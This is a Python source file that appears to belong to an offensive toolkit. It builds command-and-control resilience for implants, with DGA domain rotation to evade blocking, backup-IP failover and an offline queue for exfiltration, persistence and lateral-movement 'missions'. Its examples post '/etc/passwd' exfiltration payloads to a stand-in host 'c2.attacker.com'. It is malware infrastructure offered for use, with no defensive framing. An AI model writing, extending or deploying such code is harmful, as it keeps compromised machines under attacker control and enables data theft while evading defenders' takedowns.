"""
c2_resilience_orchestrator.py - Unified C2 Resilience Orchestration
=====================================================================
Integrates DGA Generator, Fallback Resolver, Mission Queue, and C2 API
into a single component that ensures agents never get stuck offline.

Design Principles:
1. DGA domains cached and rotated (not depleted immediately)
2. Per-domain failure tracking (track failures independently)
3. Offline mission queuing (missions never lost during outage)
4. Graceful degradation (primary → backups → DGA → offline queue)
5. Automatic recovery (retries periodically, no operator intervention needed)

Architecture:
┌──────────────────────────────────────────────────────────────┐
│ C2ResilienceOrchestrator (Main Coordinator)                  │
├──────────────────────────────────────────────────────────────┤
│  ├─ DGA Domain Pool (cached, rotated, 50/day)               │
│  │  └─ Per-domain failure tracking (retry individual domains)│
│  │                                                           │
│  ├─ Fallback Resolver (primary → backups → offline)         │
│  │  └─ Exponential backoff for failed IP endpoints          │
│  │                                                           │
│  ├─ Mission Queue (local persistence during outage)         │
│  │  └─ SQLite DB: missions, dependencies, status            │
│  │                                                           │
│  └─ C2 Status Reporter (telemetry to operator)              │
│     └─ Reports: connectivity status, fallback usage, queue  │
└──────────────────────────────────────────────────────────────┘

Integration Points:
- config_encryptor: Load encrypted C2 endpoints + DGA seed
- agents/base.py: Call orchestrator.execute_mission(mission)
- mission_queue.py: Persist missions during C2 outage
- blackroot_c2_api.py: Receive status updates, register callbacks
"""

import os
import time
import json
import logging
from typing import Optional, List, Dict, Tuple, Callable
from datetime import datetime, timedelta
from enum import Enum
import sqlite3
from pathlib import Path

try:
    from c2_dga_generator import DGAGenerator, DGAAlgorithm
    from c2_fallback_resolver import C2FallbackResolver, FailureReason
except ImportError as e:
    raise ImportError(f"Required modules not found: {e}")


class MissionStatus(Enum):
    """Mission status codes."""
    PENDING = "pending"                     # Waiting to execute
    QUEUED_OFFLINE = "queued_offline"       # Queued due to C2 outage
    IN_PROGRESS = "in_progress"             # Currently executing
    COMPLETED = "completed"                 # Successfully executed
    FAILED_TRANSIENT = "failed_transient"   # Transient error, will retry
    FAILED_PERMANENT = "failed_permanent"   # Permanent error, skip
    CANCELLED = "cancelled"                 # User cancelled


class DGADomainPool:
    """
    Manages pool of DGA domains with per-domain failure tracking.
    
    Unlike simple domain generation, this caches multiple domains and:
    - Tracks failures at domain level (not blanket depletion)
    - Rotates through domains instead of depleting cache
    - Reuses domains after success
    - Implements exponential backoff for failing domains
    
    Problem it solves:
    - Old approach: Generate 50 domains, pop first, if fails pop next, etc.
      → Cache depletes in 50 tries, then stuck
    - New approach: Maintain rotating pool, track per-domain failures
      → Even if 40 domains blocked, pool keeps rotating, finds unblocked ones
    """
    
    def __init__(self, dga_generator: DGAGenerator, pool_size: int = 50):
        """
        Initialize DGA domain pool.
        
        Args:
            dga_generator: DGAGenerator instance (already initialized with seed)
            pool_size: Number of domains to maintain per day (default 50)
        """
        self.dga = dga_generator
        self.pool_size = pool_size
        self.pool: List[str] = []          # [domain1, domain2, ...]
        self.failed_domains: Dict[str, Dict] = {}  # {domain: {count, reason, next_retry_time}}
        self.current_pool_date = None
        self.current_index = 0
        
        # Initialize pool
        self._refresh_pool_if_needed()
    
    def _refresh_pool_if_needed(self) -> None:
        """Regenerate DGA domain pool if date changed."""
        today = datetime.utcnow().strftime("%Y-%m-%d")
        
        if self.current_pool_date != today:
            # New day, regenerate all domains
            self.pool = self.dga.generate_domains_today()
            self.current_pool_date = today
            self.current_index = 0
            
            # Clear previous day's failures
            self.failed_domains = {}
    
    def get_next_domain(self) -> Optional[str]:
        """
        Get next available DGA domain (skip failed ones).
        
        Returns:
            Next domain, or None if all exhausted
        
        Strategy:
            1. Refresh pool if date changed
            2. Rotate through pool (circular)
            3. Skip permanently blacklisted domains
            4. Skip temporarily failed domains (backoff not expired)
            5. Return first available
            6. If full rotation with no available, return None (offline)
        """
        self._refresh_pool_if_needed()
        
        if not self.pool:
            return None
        
        # Try up to pool.size domains (one full rotation)
        for _ in range(len(self.pool)):
            domain = self.pool[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.pool)
            
            # Check if domain available (not failed or backoff expired)
            if self._is_domain_available(domain):
                return domain
        
        # Full rotation, no available domains
        return None
    
    def _is_domain_available(self, domain: str) -> bool:
        """Check if domain is available (not failed/blacklisted)."""
        if domain not in self.failed_domains:
            return True
        
        failure_info = self.failed_domains[domain]
        now = time.time()
        
        # Check if backoff expired
        next_retry = failure_info.get("next_retry_time", 0)
        if next_retry > now:
            return False  # Still in backoff
        
        # Backoff expired, domain available again
        return True
    
    def report_domain_failure(self, domain: str, reason: str) -> None:
        """
        Report failure for a DGA domain.
        
        Args:
            domain: Domain that failed
            reason: Reason (e.g., "DNS_FAILED", "HTTP_403", "TIMEOUT")
        
        Effect:
            - Increments failure count
            - Calculates exponential backoff
            - Domain unavailable for next_retry_time seconds
        """
        if domain not in self.failed_domains:
            self.failed_domains[domain] = {
                "count": 0,
                "reasons": [],
                "first_failure_time": time.time(),
                "next_retry_time": 0,
            }
        
        failure_info = self.failed_domains[domain]
        failure_info["count"] += 1
        failure_info["reasons"].append(reason)
        
        # Calculate exponential backoff: 1s, 2s, 4s, 8s, ... (capped at 1h)
        base = 1.0
        multiplier = 2.0
        max_backoff = 3600.0
        
        backoff = base * (multiplier ** (failure_info["count"] - 1))
        backoff = min(backoff, max_backoff)
        failure_info["next_retry_time"] = time.time() + backoff
    
    def report_domain_success(self, domain: str) -> None:
        """
        Report successful connection to DGA domain.
        
        Args:
            domain: Domain that succeeded
        
        Effect:
            - Clears failure count
            - Domain immediately available again
        """
        if domain in self.failed_domains:
            del self.failed_domains[domain]
    
    def get_pool_stats(self) -> Dict:
        """Get DGA pool statistics."""
        available = sum(1 for d in self.pool if self._is_domain_available(d))
        return {
            "total_domains": len(self.pool),
            "available_domains": available,
            "failed_domains": len(self.failed_domains),
            "current_index": self.current_index,
            "pool_date": self.current_pool_date,
        }


class OfflineMissionQueue:
    """
    Local mission queue for C2 outages.
    
    Stores missions to SQLite while C2 unreachable,
    auto-flushes when connectivity restored.
    """
    
    def __init__(self, db_path: str = "~/.blackroot_queue.db"):
        """Initialize offline mission queue."""
        self.db_path = os.path.expanduser(db_path)
        self._init_db()
    
    def _init_db(self) -> None:
        """Initialize SQLite schema."""
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        conn = sqlite3.connect(self.db_path)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS missions (
                id PRIMARY KEY,
                mission_type TEXT,
                payload TEXT,
                timestamp REAL,
                status TEXT,
                retry_count INTEGER DEFAULT 0
            )
        """)
        conn.commit()
        conn.close()
    
    def enqueue(self, mission_id: str, mission_type: str, payload: dict) -> None:
        """Queue a mission locally."""
        conn = sqlite3.connect(self.db_path)
        conn.execute(
            "INSERT OR REPLACE INTO missions VALUES (?, ?, ?, ?, ?, ?)",
            (mission_id, mission_type, json.dumps(payload), time.time(), 
             MissionStatus.QUEUED_OFFLINE.value, 0)
        )
        conn.commit()
        conn.close()
    
    def get_pending_missions(self, limit: int = 10) -> List[Dict]:
        """Get missions waiting to execute."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.execute(
            "SELECT * FROM missions WHERE status IN (?, ?) LIMIT ?",
            (MissionStatus.PENDING.value, MissionStatus.QUEUED_OFFLINE.value, limit)
        )
        missions = [dict(zip([desc[0] for desc in cursor.description], row))
                   for row in cursor.fetchall()]
        conn.close()
        return missions
    
    def mark_completed(self, mission_id: str) -> None:
        """Mark mission as completed."""
        conn = sqlite3.connect(self.db_path)
        conn.execute(
            "UPDATE missions SET status = ? WHERE id = ?",
            (MissionStatus.COMPLETED.value, mission_id)
        )
        conn.commit()
        conn.close()
    
    def mark_failed(self, mission_id: str, transient: bool = True) -> None:
        """Mark mission as failed."""
        status = MissionStatus.FAILED_TRANSIENT.value if transient else MissionStatus.FAILED_PERMANENT.value
        conn = sqlite3.connect(self.db_path)
        conn.execute(
            "UPDATE missions SET status = ?, retry_count = retry_count + 1 WHERE id = ?",
            (status, mission_id)
        )
        conn.commit()
        conn.close()
    
    def queue_size(self) -> int:
        """Get number of queued missions."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.execute("SELECT COUNT(*) FROM missions WHERE status = ?",
                            (MissionStatus.QUEUED_OFFLINE.value,))
        count = cursor.fetchone()[0]
        conn.close()
        return count


class C2ResilienceOrchestrator:
    """
    Unified C2 resilience coordinator.
    
    Orchestrates:
    - DGA domain pool (cached, per-domain failure tracking)
    - Fallback resolver (primary → backups → offline)
    - Mission queue (local persistence)
    - Status reporting (telemetry)
    
    Ensures agent never gets stuck offline.
    """
    
    def __init__(self, primary_c2: str, backup_ips: List[str], 
                 dga_generator: DGAGenerator, state_file: str = "~/.blackroot_c2_state",
                 queue_db: str = "~/.blackroot_queue.db",
                 logger: Optional[logging.Logger] = None):
        """
        Initialize orchestrator.
        
        Args:
            primary_c2: Primary C2 endpoint (decrypted from config)
            backup_ips: List of backup IPs (decrypted from config)
            dga_generator: DGAGenerator instance (with seed loaded)
            state_file: Path to persistent fallback resolver state
            queue_db: Path to mission queue database
            logger: Logger instance (optional)
        """
        self.logger = logger or logging.getLogger("C2Orchestrator")
        
        # Initialize components
        self.fallback_resolver = C2FallbackResolver(
            primary_c2=primary_c2,
            backup_ips=backup_ips,
            dga_generator=dga_generator,
            state_file=state_file
        )
        
        self.dga_pool = DGADomainPool(dga_generator, pool_size=50)
        self.mission_queue = OfflineMissionQueue(queue_db)
        
        # Track connectivity state
        self.offline_since: Optional[float] = None
        self.last_successful_c2: Optional[str] = None
        self.connectivity_callbacks: List[Callable] = []
    
    def register_connectivity_callback(self, callback: Callable[[bool], None]) -> None:
        """
        Register callback for connectivity state changes.
        
        Args:
            callback: Function(is_online: bool) called when connectivity changes
        
        Example:
            def on_connectivity_change(is_online):
                if is_online:
                    print("[+] C2 online, flushing mission queue")
                else:
                    print("[-] C2 offline, queuing missions locally")
            
            orchestrator.register_connectivity_callback(on_connectivity_change)
        """
        self.connectivity_callbacks.append(callback)
    
    def _notify_connectivity_change(self, is_online: bool) -> None:
        """Fire connectivity callbacks."""
        for callback in self.connectivity_callbacks:
            try:
                callback(is_online)
            except Exception as e:
                self.logger.error(f"Callback error: {e}")
    
    def get_next_c2(self) -> Optional[str]:
        """
        Get next C2 endpoint to try (fallback chain).
        
        Returns:
            Next C2 endpoint, or None if completely offline
        
        Strategy:
            1. Try fallback resolver (handles primary + backups + exponential backoff)
            2. If resolver returns None, try DGA domain pool
            3. If pool returns None, return None (offline)
        """
        # Try static endpoints first (primary + backups)
        c2 = self.fallback_resolver.get_next_c2()
        if c2 and not c2.endswith(('.com', '.net', '.org', '.io', '.xyz', '.cc', '.ws')):
            # Returned an IP endpoint
            return c2
        
        # If fallback resolver returned a DGA domain, use it
        if c2:
            return c2
        
        # Try DGA domain pool
        dga_domain = self.dga_pool.get_next_domain()
        if dga_domain:
            return dga_domain
        
        # Completely offline
        return None
    
    def execute_mission(self, mission_id: str, mission_type: str, payload: dict,
                       execute_func: Callable[[str, str, dict], bool]) -> bool:
        """
        Execute mission with resilience (offline fallback).
        
        Args:
            mission_id: Unique mission ID
            mission_type: Type of mission (e.g., "EXFIL", "PERSIST", "LATERAL")
            payload: Mission payload (dict)
            execute_func: Callable(c2_endpoint, mission_type, payload) -> bool
                         Returns True if succeeded, False if failed
        
        Returns:
            True if executed successfully, False if queued offline
        
        Behavior:
            1. Get next C2 endpoint
            2. If available: Try to execute via execute_func
               - Success: Report success, flush offline queue if applicable
               - Transient failure: Report failure, queue mission (retry later)
               - Permanent failure: Report failure, skip mission
            3. If no C2 available: Queue mission offline, return False
        
        Example integration:
            def execute(c2_endpoint, mission_type, payload):
                response = http_client.post(c2_endpoint + "/execute", 
                                           json={"type": mission_type, "payload": payload})
                return response.status_code == 200
            
            success = orchestrator.execute_mission(
                mission_id="EXFIL_001",
                mission_type="EXFIL",
                payload={"files": ["/etc/passwd"]},
                execute_func=execute
            )
            
            if not success:
                print("Mission queued offline, will retry when C2 online")
        """
        next_c2 = self.get_next_c2()
        
        if next_c2 is None:
            # No C2 available, queue offline
            self.mission_queue.enqueue(mission_id, mission_type, payload)
            
            # Notify connectivity change if not already offline
            if self.offline_since is None:
                self.offline_since = time.time()
                self._notify_connectivity_change(False)
            
            self.logger.warning(f"[!] No C2 available, queued mission {mission_id} offline")
            return False
        
        try:
            # Try to execute
            success = execute_func(next_c2, mission_type, payload)
            
            if success:
                # Mission succeeded
                self.mission_queue.mark_completed(mission_id)
                self.fallback_resolver.report_success(next_c2)
                self.dga_pool.report_domain_success(next_c2)
                self.last_successful_c2 = next_c2
                
                # Notify if just came online
                if self.offline_since is not None:
                    self.offline_since = None
                    self._notify_connectivity_change(True)
                    self.logger.info(f"[+] C2 online via {next_c2}, flushing queue")
                
                return True
            else:
                # Mission failed (transient or permanent)
                # Assume transient for now, queue for retry
                self.mission_queue.enqueue(mission_id, mission_type, payload)
                self.fallback_resolver.report_failure(next_c2, FailureReason.HTTP_TIMEOUT)
                
                # Report DGA domain failure if applicable
                if next_c2.endswith(('.com', '.net', '.org', '.io', '.xyz', '.cc', '.ws')):
                    self.dga_pool.report_domain_failure(next_c2, "HTTP_TIMEOUT")
                
                self.logger.warning(f"[!] Mission {mission_id} failed via {next_c2}, queued for retry")
                return False
        
        except Exception as e:
            # Connection error
            self.mission_queue.enqueue(mission_id, mission_type, payload)
            self.fallback_resolver.report_failure(next_c2, FailureReason.CONNECTION_TIMEOUT)
            
            if next_c2.endswith(('.com', '.net', '.org', '.io', '.xyz', '.cc', '.ws')):
                self.dga_pool.report_domain_failure(next_c2, "CONNECTION_TIMEOUT")
            
            self.logger.error(f"[!] Connection error to {next_c2}: {e}")
            return False
    
    def flush_offline_queue(self, execute_func: Callable) -> Dict[str, int]:
        """
        Attempt to flush queued missions during outage recovery.
        
        Args:
            execute_func: Same as execute_mission's execute_func
        
        Returns:
            Dict with counts: {completed, failed_transient, failed_permanent}
        
        Example:
            stats = orchestrator.flush_offline_queue(execute_func)
            print(f"Flushed {stats['completed']} missions, "
                  f"{stats['failed_transient']} queued for retry)
        """
        stats = {"completed": 0, "failed_transient": 0, "failed_permanent": 0}
        
        while True:
            missions = self.mission_queue.get_pending_missions(limit=5)
            if not missions:
                break
            
            for mission in missions:
                success = self.execute_mission(
                    mission_id=mission["id"],
                    mission_type=mission["mission_type"],
                    payload=json.loads(mission["payload"]),
                    execute_func=execute_func
                )
                
                if success:
                    stats["completed"] += 1
                else:
                    stats["failed_transient"] += 1
        
        return stats
    
    def get_status(self) -> Dict:
        """
        Get orchestrator status (for diagnostics/reporting).
        
        Returns:
            Dict with connectivity, queue, and DGA pool status
        
        Example:
            status = orchestrator.get_status()
            print(f"Online: {status['online']}")
            print(f"Queue depth: {status['queue_depth']}")
            print(f"Available DGA domains: {status['available_dga_domains']}")
        """
        fallback_status = self.fallback_resolver.get_failover_status()
        dga_stats = self.dga_pool.get_pool_stats()
        queue_size = self.mission_queue.queue_size()
        
        return {
            "online": self.offline_since is None,
            "offline_duration_seconds": time.time() - self.offline_since if self.offline_since else 0,
            "last_successful_c2": self.last_successful_c2,
            "primary_healthy": fallback_status.get("primary_healthy", False),
            "healthy_backups": len(fallback_status.get("healthy_backups", [])),
            "available_dga_domains": dga_stats.get("available_domains", 0),
            "total_dga_domains": dga_stats.get("total_domains", 0),
            "queue_depth": queue_size,
            "failed_dga_domains": dga_stats.get("failed_domains", 0),
        }


# ============================================================================
# INTEGRATION NOTES: How to use in agents/base.py
# ============================================================================

# Copy this pattern into agents/base.py:
#
# In BaseAgent.__init__():
#   from config_encryptor import ConfigEncryptor
#   from c2_dga_generator import create_dga_from_config
#   from c2_resilience_orchestrator import C2ResilienceOrchestrator
#
#   self.cfg = ConfigEncryptor()
#   self.cfg.load_config_from_env()
#   self.dga = create_dga_from_config(self.cfg)
#   self.orchestrator = C2ResilienceOrchestrator(
#       primary_c2=self.cfg.get("c2.endpoint"),
#       backup_ips=self.cfg.get("c2.backup_ips", []),
#       dga_generator=self.dga,
#       logger=self.logger
#   )
#
# In mission execution:
#   def execute_via_c2(c2, mission_type, payload):
#       response = self.http_client.post(c2 + "/api/execute", json={...})
#       return response.status_code == 200
#
#   self.orchestrator.execute_mission(
#       mission_id=mission_id,
#       mission_type=mission_type,
#       payload=mission_payload,
#       execute_func=execute_via_c2
#   )
#
# Orchestrator handles:
# - Primary > Backups > DGA > Offline fallback chain
# - Exponential backoff for failed endpoints
# - Per-domain failure tracking
# - Mission queue persistence (SQLite)


if __name__ == "__main__":
    print("[*] C2 Resilience Orchestrator - Integration Demo")
    print()
    
    # Demo 1: Setup
    print("[*] Demo 1: Initialize orchestrator")
    from c2_dga_generator import DGAGenerator
    
    dga = DGAGenerator(seed="test_seed_2026", algorithm="TLDCYCLE")
    orchestrator = C2ResilienceOrchestrator(
        primary_c2="https://c2.attacker.com:8443",
        backup_ips=["10.0.0.5:8443", "203.0.113.42:443"],
        dga_generator=dga,
        logger=logging.getLogger("demo")
    )
    print("[+] Orchestrator initialized")
    print()
    
    # Demo 2: Status reporting
    print("[*] Demo 2: Check initial status")
    status = orchestrator.get_status()
    for key, value in status.items():
        print("    {}: {}".format(key, value))
    print()
    
    # Demo 3: Primary fails, backups work
    print("[*] Demo 3: Primary fails, backup IP takes over")
    count = [0]  # Use list to avoid nonlocal issues
    
    def execute_fail_primary(c2, mission_type, payload):
        count[0] += 1
        print("    [>] Try #{} to {}".format(count[0], c2))
        if count[0] >= 2:
            return True  # Succeeds on backup
        return False
    
    success = orchestrator.execute_mission(
        mission_id="MISSION_001",
        mission_type="EXFIL",
        payload={"target": "/etc/passwd"},
        execute_func=execute_fail_primary
    )
    print("[+] Mission fallback to backup: {}".format(success))
    print()
    
    # Demo 4: Status after partial outage
    print("[*] Demo 4: Final orchestrator status")
    status = orchestrator.get_status()
    for key, value in status.items():
        print("    {}: {}".format(key, value))
    
    print()
    print("[*] Demo complete!")
